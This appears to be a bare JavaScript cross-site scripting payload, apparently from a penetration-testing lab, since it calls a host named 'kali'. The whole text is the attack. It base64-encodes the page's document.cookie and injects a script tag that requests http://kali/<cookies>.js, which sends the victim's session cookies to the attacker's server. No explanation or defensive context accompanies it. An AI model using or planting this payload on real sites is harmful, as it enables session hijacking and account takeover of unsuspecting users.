  alert("Remote JS Injection");
  var cookiez=btoa(document.cookie);
  var js = document.createElement("script");
  js.setAttribute("type", "text/javascript");
//  console.log(cookiez);
//  console.log('http://kali/'+cookiez+'.js')
  js.setAttribute("src", 'http://kali/'+cookiez+'.js');
  document.getElementsByTagName("head")[0].appendChild(js);

